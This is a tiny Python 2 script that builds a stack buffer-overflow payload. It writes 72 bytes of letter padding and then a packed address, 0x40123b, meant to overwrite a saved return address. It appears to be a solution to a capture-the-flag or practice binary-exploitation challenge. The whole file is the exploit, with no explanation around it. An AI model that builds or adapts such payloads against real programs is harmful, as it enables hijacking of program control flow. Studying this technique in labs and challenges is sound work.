#!/usr/bin/env python2

import struct

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
payload += struct.pack("I",0x000000000040123b)
print(payload)
